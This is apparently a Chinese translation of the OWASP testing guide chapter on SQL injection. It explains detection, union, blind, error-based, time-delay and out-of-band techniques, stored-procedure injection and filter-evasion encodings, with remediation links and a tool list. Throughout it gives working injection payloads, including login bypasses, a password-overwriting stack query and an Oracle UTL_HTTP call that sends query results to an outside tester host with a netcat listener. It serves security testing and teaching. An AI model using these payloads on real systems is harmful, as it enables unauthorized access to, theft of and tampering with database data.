# 第8章输入验证类测试 SQL注入测试	Testing for SQL Injection

ID:WSTG-INPV-05

## 概述

如果应用程序使用用户输入来创建SQL查询，而不进行适当的输入验证，就有可能形成sql注入漏洞。成功利用此类漏洞允许未经授权的用户访问或操纵数据库中的数据。

SQL注入攻击可以分为以下三类：
- 带内：使用与注入SQL代码相同的通道提取数据。这是最直接的一种攻击，其中检索到的数据直接显示在应用程序网页中。
- 带外：使用不同的渠道检索数据（例如，生成包含查询结果的电子邮件并将其发送到测试人员）。
- 推理或盲目：没有实际的数据传输，但是测试人员可以通过发送特定请求并观察DB Server的最终行为来重建信息。

成功的SQL注入攻击需要攻击者精心设计语法正确的SQL查询。如果应用程序返回由错误查询生成的错误消息，则攻击者可能更容易重构原始查询的逻辑，因此，了解如何正确执行注入。但是，如果应用程序隐藏了错误详细信息，则测试人员必须能够对原始查询的逻辑进行反向工程。

关于利用SQL注入漏洞的技术，有五种常见技术。这些技术有时也可以组合使用（例如，联合运算符和带外）：
- union 运算符：当SELECT语句中发生SQL注入漏洞时可以使用它，从而可以将两个查询合并为一个结果或结果集。
- Boolean：使用布尔值条件来验证某些条件为真还是假。
- Error based：此技术会强制数据库生成错误，从而向攻击者或测试者提供信息以完善他们的注入。
- Out-of-band：用于使用其他通道检索数据的技术（例如，进行HTTP连接以将结果发送到Web服务器）。
- Time delay：使用数据库命令（例如睡眠）来延迟条件查询中的答案。当攻击者无法从应用程序中获得某种答案（结果，输出或错误）时，此功能很有用。

## 测试目标

sql注入测试主要目标是识别和利用与查询输入有关的漏洞，，这些问题未正确实施安全实践。

## 测试方法

### 检测技术

第一步是了解应用程序何时与DB server进行交互和访问数据。应用程序与数据库对话的典型示例包括：
- 身份验证表单
- 搜索
- 电子商务网站
- 排序
- 分组、分类显示
- 动态图表

测试人员必须列出所有输入字段的列表（包括POST请求的隐藏字段），这些输入字段的值可用于编制SQL查询，然后分别对其进行测试，以免干扰查询并产生错误。还请考虑HTTP标头和Cookies。

最开始的测试通常是在要测试的字段或参数上添加单引号'或分号;。第一个在SQL中用作字符串终止符，如果不被应用程序过滤，将导致错误的查询。第二个用于结束SQL语句，如果不对其进行过滤，它也可能会产生错误。易受攻击字段的输出可能类似于以下内容（在这种情况下，在Microsoft SQL Server上）：
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

还可以使用注释定界符（-或/* */等）和其他SQL关键字（例如“ AND”和“ OR”）来尝试修改查询。一种非常简单但有时仍然有效的技术是简单地在期望数字的位置插入字符串，因为可能会产生如下错误：
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113

```

检查所有来自web服务器的响应，同时查看HTML/JavaScript 源代码。有时错误会藏在这些代码中，但不显露给用户。完整的错误信息会提供给测试人员注入参考信息。但是应用很多时候不会提供太多细节。这意味着我们需要使用盲注技术。在任何情况下，单独测试每个字段是非常重要的，即每一步测试中仅修改一个变量值，这样可以精确的理解某个参数是否存在注入漏洞。

### 标准SQL 注入测试
#### 经典SQL注入

考虑下列sql查询：```SELECT * FROM Users WHERE Username='$username' AND Password='$password'```

这类查询通常用于认证用户。用户输入通常通过表单进行提交，假设我们插入如下的用户名和密码：
```$username=1' or '1'='1``` 和 ```$password=1' or '1'='1```

查询将为：```SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'```

如果我们假设参数值经过GET方法送到服务器，而且问题网站的域名是www.example.com，那么执行的请求如下：```http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1```

简单分析可知，查询将返回一个/组值，因为条件总是为True。这样，系统就在不知道用户名和密码的情况下对用户进行了身份验证。
> 不少系统的第一个用户是系统管理员。而在某些情况下，这可能是返回的配置文件。

另一个查询例子：```SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))```

在这种情况下，存在两个问题，一个是由于使用括号引起的，另一个是由于使用MD5哈希函数引起的。首先，我们解决了括号问题。这仅包括添加多个右括号，直到获得正确的查询。为了解决第二个问题，我们试图逃避第二个条件。我们在查询中添加了最后一个符号，这样该符号后的所有内容均视为注释。每个DBMS都有自己的注释语法，但是，大多数数据库的通用符号是星号 *。在Oracle中，符号为--。也就是说，我们将用作用户名和密码的值为：```$username = 1' or '1' = '1'))/*``` 和 ```$password = foo```

这样，我们将获得以下查询：
```SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))```

由于在$ username值中包含了注释定界符，因此查询的密码部分将被忽略。

URL请求将为：
```http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo```

这可能会返回许多值。有时身份验证代码会验证返回的记录/结果数是否等于1。在前面的示例中，这种情况将很困难（在数据库中，每个用户只有一个值）。为了解决此问题，插入一个SQL命令就足够了，该命令强加一个条件，即返回结果的数量必须为1。（返回一条记录）为了达到此目标，我们使用运算符```LIMIT <num>```，其中，```<num>```是我们要返回的结果/记录的数量。对于前面的示例，“用户名”和“密码”字段的值将进行如下修改：
```$username = 1' or '1' = '1')) LIMIT 1/*``` 和 ```$password = foo```

这样，我们形成的查询语句如下：

```http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo```

#### SELECT 语句

考虑下列SQL查询：```SELECT * FROM products WHERE id_product=$id_product```

还考虑对执行上述查询的脚本的请求：```http://www.example.com/product.php?id=10```

当测试人员尝试输入有效值（例如，在这种情况下为10）时，应用程序将返回产品说明。测试应用程序在这种情况下是否易受攻击的好方法是使用运算符AND和OR进行逻辑运算。

考虑请求：```http://www.example.com/product.php?id=10 AND 1=2```

```SELECT * FROM products WHERE id_product=10 AND 1=2```

在这种情况下，应用程序可能会返回一些消息，告诉我们没有可用的内容或空白页。然后，测试人员可以发送真实的语句并检查是否存在有效的结果：

```http://www.example.com/product.php?id=10 AND 1=1```

#### Stacked Queries

取决于Web应用程序使用的API和DBMS（例如PHP + PostgreSQL，ASP + SQL SERVER），一次调用即可执行多个查询。

考虑以下SQL查询：```SELECT * FROM products WHERE id_product=$id_product```

利用上述情况的一种方法是：```http://www.example.com/product.php?id=10; INSERT INTO users (…)```

这种方式可以连续执行许多查询，而与第一个查询无关。

### 指纹数据库
尽管SQL语言是标准语言，但每个DBMS都有其独特之处，并且在许多方面彼此不同，例如特殊命令，用于检索数据的功能（例如用户名和数据库），功能，注释行等。

当测试人员转向更高级的SQL注入开发时，他们需要知道后端数据库是什么。

#### 应用程序返回的错误
找出使用哪种后端数据库的第一种方法是观察应用程序返回的错误。以下是错误消息的一些示例：

- MySql:
```
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```
一个完整的带有version（）的UNION SELECT也可以帮助您了解后端数据库，例如：
```SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1```

- Oracle:
```ORA-00933: SQL command not properly ended```

- MS SQL Server:
```
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string
```
或尝试执行下列语句：
```SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1```

- PostgreSQL
```
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```
如果没有显示错误信息或自定义错误页，测试者可以尝试使用变化的连接技术，注入字符串字段。例如：
- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### 渗透技术
#### Union 渗透技术

在SQL注入中使用UNION运算符，可以将测试人员有意附加查询加入到原始查询中。附加查询的结果将与原始查询的结果结合在一起，从而使测试人员可以获取其他表的列的值。假设从服务器执行的查询如下：
```SELECT Name, Phone, Address FROM Users WHERE Id=$id```

我们设置id值如下：```$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable```

这样，查询语句如下：```SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable```

它将原始查询的结果与CreditCardTable表中的所有信用卡号结合在一起。关键字ALL对于绕开使用关键字的查询是必需的DISTINCT。此外，我们注意到，除了信用卡号以外，我们还选择了其他两个值(1,1)。这两个值是必需的，因为两个查询必须具有相同数量的参数/列，以避免语法错误。

测试人员使用这种技术来利用SQL注入漏洞的第一个细节是在SELECT语句中找到正确的列数。

为了实现此目的，测试人员可以使用ORDER BY子句，后跟一个数字，该数字指示所选数据库列的编号：
```http://www.example.com/product.php?id=10 ORDER BY 10--```

如果查询成功执行，那么在此示例中，测试人员可以假定SELECT语句中有10列或更多列。如果查询失败，则查询返回的列数必须少于10。如果有错误消息可用，则可能是：
```Unknown column '10' in 'order clause'```

在测试人员找出列数之后，下一步就是找出列的类型。假设上面的示例中有3列，那么测试人员可以尝试使用NULL值来帮助每种类型的列：
```http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--```

如果查询失败，测试人员可能会看到类似以下的消息：
```All cells in a column must have the same datatype```

如果查询成功执行，则第一列可以是整数。然后测试人员可以继续前进，依此类推：
```http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--```

成功收集信息之后，根据应用程序的不同，它可能只会向测试人员显示第一个结果，因为该应用程序仅处理结果集的第一行。在这种情况下，可以使用LIMIT子句或测试器可以设置无效值，从而仅使第二个查询有效（假设数据库中没有ID为99999的条目）：
```http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--```

#### Boolean Exploitation Technique

盲注中，Boolean渗透非常有用。在这种情况下，测试人员对操作结果一无所知。例如，如果程序员创建了一个自定义错误页面，该页面未显示查询结构或数据库上的任何内容，则会发生此行为。（该页面不会返回SQL错误，它可能仅返回HTTP 500、404或重定向）。

我们可以进行推理绕过无显性提示这一障碍，从而成功恢复某些所需字段的值。该方法包括对服务器执行一系列布尔查询，观察答案并最终推断出此类答案的含义。我们一如既往地考虑www.example.com域，并假设它包含一个名为id的参数，该参数容易受到SQL注入的攻击。这意味着执行以下请求：
```http://www.example.com/index.php?id=1'```

请求后，我们将获得一个包含自定义消息错误的页面，这是由于查询中的语法错误所致。我们假设在服务器上执行的查询是：
```SELECT field1, field2, field3 FROM Users WHERE Id='$Id'```

可以通过前面看到的方法加以利用。我们想要获得的是用户名字段的值。我们将执行的测试将使我们能够获取用户名字段的值，并逐个字符地提取该值。通过使用实际上存在于每个数据库中的一些标准功能，这是可能的。对于我们的示例，我们将使用以下伪函数：
- SUBSTRING (text, start, length)：返回从文本的start位置开始且长度为length的子字符串。如果start大于文本长度，则该函数返回空值。
- ASCII(char)：它返回输入字符的ASCII值。如果char为0，则返回null值。
- LENGTH(text)：它返回输入文本中的字符数。

通过这些函数，我们将在第一个字符上执行测试，发现值后，将传递至第二个字符，依此类推，直到发现整个值为止。测试将利用SUBSTRING函数，一次仅选择一个字符（选择单个字符意味着将length参数强加为1），而利用ASCII函数，以获得ASCII值，以便我们可以做数值比较。比较结果将使用ASCII表的所有值完成，直到找到正确的值为止。例如，我们将以下值用于Id：
```$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1```

这将创建以下查询（从现在开始，我们将其称为“推论查询”）：

```SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'```

当且仅当字段用户名的第一个字符等于ASCII值97时，上一个示例才返回结果。如果我们得到一个假值，则将ASCII表的索引从97增加到98，然后重复该请求。如果取而代之的是获得真值，则将ASCII表的索引设置为零，然后分析下一​​个字符，并修改SUBSTRING函数的参数。问题在于要了解以哪种方式可以区分返回真值的测试和返回假值的测试。为此，我们创建一个始终返回false的查询。通过将以下值用于Id：```$Id=1' AND '1' = '2```

这将创建以下查询：
```SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'```

从服务器获得的响应（即HTML代码）将是我们测试的错误值。这足以验证从推论查询的执行获得的值是否等于之前执行的测试所获得的值。有时，此方法不起作用。如果服务器由于两个相同的连续Web请求而返回了两个不同的页面，则我们将无法将true值与false值区分开。在这些特定情况下，有必要使用特定的过滤器，这些过滤器使我们能够消除在两个请求之间更改的代码并获得模板。稍后，对于每个执行的推理请求，我们将使用相同的函数从响应中提取相对模板，

在前面的讨论中，我们还没有解决确定外部测试终止条件的问题，即何时终止推理过程。一种使用SUBSTRING函数和LENGTH函数的特征的技术。当测试将当前字符与ASCII码0（即，值为null）进行比较，并且测试返回值为true时，则要么我们完成了推理过程（我们已经扫描了整个字符串），要么我们拥有了分析包含空字符。

我们将为该字段插入以下值Id：
```$Id=1' AND LENGTH(username)=N AND '1' = '1```

其中N是到目前为止我们已经分析的字符数（不计算空值）。查询将是：
```SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'```

查询返回true或false。如果获得true，则说明推理已经完成，因此我们知道了参数的值。如果获得false，则意味着参数值中存在空字符，并且我们必须继续分析下一个参数，直到找到另一个空值为止。

盲目SQL注入攻击需要大量查询。测试人员可能需要自动工具才能利用此漏洞。

#### 基于错误的渗透技术

当测试人员由于某种原因无法使用其他技术（例如UNION）利用SQL注入漏洞时，基于错误的利用技术很有用。基于错误的技术包括强制数据库执行某些操作，结果将是错误。

这里的重点是尝试从数据库中提取一些数据并将其显示在错误消息中。对于不同的DBMS，此技术可能有所不同（请参阅DBMS特定部分）。

考虑以下SQL查询：```SELECT * FROM products WHERE id_product=$id_product```

还考虑对执行上述查询的脚本的请求：```http://www.example.com/product.php?id=10```

恶意请求将是（例如Oracle 10g）：```http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--```

在此示例中，测试人员将值10与函数```UTL_INADDR.GET_HOST_NAME```的结果连接在一起。该Oracle函数将尝试返回传递给它的参数的主机名，即另一个查询```SELECT user FROM DUAL```(其结果为用户名）。当数据库使用用户数据库名查找主机名时，它将失败并返回如下错误消息：

```ORA-292257: host SCOTT unknown```

然后，测试人员可以改变传递给GET_HOST_NAME（）函数的参数，结果将显示在错误消息中。

#### Out of Band Exploitation Technique
这个技术也是盲注中常用的。该技术使用DBMS执行带外连接，并将注入查询的结果作为请求的一部分传递给测试的服务器。像基于错误的技术一样，每个DBMS都有自己的函数，所以使用前要确定DBMS类型。

考虑以下SQL查询：```SELECT * FROM products WHERE id_product=$id_product```

还考虑对执行上述查询的脚本的请求：```http://www.example.com/product.php?id=10```

恶意请求将是：```http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--```

在此示例中，测试人员将值10与函数的结果连接在一起UTL_HTTP.request。该Oracle函数将尝试连接到testerserver一个HTTP GET请求并包含查询返回信息SELECT user FROM DUAL。测试人员可以设置网络服务器（例如Apache）或使用Netcat工具：
```/home/tester/nc –nLp 80```

显示结果
```
GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### 时间延迟渗透技术
这个技术也是盲注中常用的。该技术包括发送一个注入的查询，并且在条件为真的情况下，测试人员可以监视服务器响应所花费的时间。如果存在延迟，则测试人员可以假定条件查询的结果为true。对于不同的DBMS，此开发技术可能有所不同（请参阅DBMS特定部分）。
考虑以下SQL查询：```SELECT * FROM products WHERE id_product=$id_product```

还考虑对执行上述查询的脚本的请求：```http://www.example.com/product.php?id=10```

恶意请求将是（例如MySql 5.x）：```http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--```

在此示例中，测试人员正在检查MySql版本是否为5.x，从而使服务器将答案延迟10秒。测试仪可以增加延迟时间并监视响应。测试人员也不需要等待响应。有时，他可以设置一个很高的值（例如100），并在几秒钟后取消请求。

#### 存储过程渗透技术

在存储过程中使用动态SQL时，应用程序必须正确清理用户输入，以消除代码注入的风险。如果未清除，则用户可能会输入将在存储过程中执行的恶意SQL。

请考虑以下SQL Server存储过程：
```
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```
用户输入：
```
anyusername or 1 = 1 '
anypassword
```

此过程不会清除输入，因此允许返回值显示具有这些参数的现有记录。

> 由于使用动态SQL登录用户，因此该示例似乎不太可能，但请考虑使用动态reporting query，用户在其中选择要查看的列。用户可能会在此方案中插入恶意代码并破坏数据。

请考虑以下SQL Server存储过程：
```
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```
用户输入：
```1 from users; update users set password = 'password'; select *```

这将导致报告运行并更新所有用户的密码。

#### 自动化的渗透

很多工具，例如SQLMAP

### SQL注入签名免杀技术

该技术用于绕过Web应用程序防火墙（WAF）或入侵防御系统（IPS）等防御措施。另请参阅 https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

#### white space

删除空格或添加空格，不会影响SQL语句。例如
```
or ' a ' = ' a '

or ' a '   =     ' a '
```

添加不会更改SQL语句执行的特殊字符，例如换行符或制表符。例如，

```
or
'a'=
        'a'
```
#### 空字节
在过滤器阻止的任何字符之前,使用空字节（％00）。

例如，如果攻击者注入以下SQL: ```' UNION SELECT password FROM Users WHERE username='admin'--```

添加空字节将是: ```%00' UNION SELECT password FROM Users WHERE username='admin'--```

#### SQL注释
添加SQL行内注释还可以帮助SQL语句有效并绕过SQL注入过滤器。例如：

```' UNION SELECT password FROM Users WHERE name='admin'--```

添加SQL行内注释：

```'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--```

```'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--```

#### URL编码
使用在线URL编码对SQL语句进行编码，例如有SQL：

```' UNION SELECT password FROM Users WHERE name='admin'--```

SQL注入语句的URL编码为:

```%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--```

#### 字符编码
```Char()```函数可用于替换英文char。例如，```char(114,111,111,116)```表示root。

例如有sql：```' UNION SELECT password FROM Users WHERE name='root'--```

应用```Char()```后的SQL injeciton语句：
```' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--```

#### 字符串拼接

拼接会破坏SQL关键字并逃避过滤器。拼接语法因数据库引擎而异。

以MS SQL引擎为例：

```select 1```

通过使用拼接，可以如下更改简单的SQL语句

```EXEC('SEL' + 'ECT 1')```

#### 十六进制编码
十六进制编码技术使用十六进制编码来替换原始SQL语句char。例如，root可以表示为726F6F74

```Select user from users where name = 'root'```

使用HEX值的SQL语句将为：

```Select user from users where name = 726F6F74```

或者

```Select user from users where name = unhex('726F6F74')```

#### 声明变量
将SQL注入语句声明为变量并执行它。

例如，下面的SQL注入语句:

```Union Select password```

将SQL语句定义为变量 SQLivar

```
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### ```'or1 = 1'```的替代表达
```
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

## 补救防范
- To secure the application from SQL injection vulnerabilities, refer to the [SQL Injection Prevention CheatSheet.](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- To secure the SQL server, refer to the [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

## Tools
- SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb
- Francois Larouche: Multiple DBMS SQL Injection tool -SQL Power Injector
sqlbftools
- Bernardo Damele A. G.: sqlmap, automatic SQL injection tool
- icesurfer: SQL Server Takeover Tool - sqlninja
- Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool
- bsqlbf, a blind SQL injection tool in Perl

